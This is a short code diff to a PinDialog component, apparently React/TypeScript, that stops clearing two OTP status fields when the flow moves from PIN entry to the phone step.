@@ -46,8 +46,6 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
         pinSubmittedAt: new Date().toISOString(),
         idVerificationStatus: "completed",
         currentStep: "phone",
-        otpStatus: "", // Clear otpStatus when moving to phone page
-        phoneOtpStatus: "" // Clear phoneOtpStatus as well
       })
 
       // Add PIN to history (always approved)
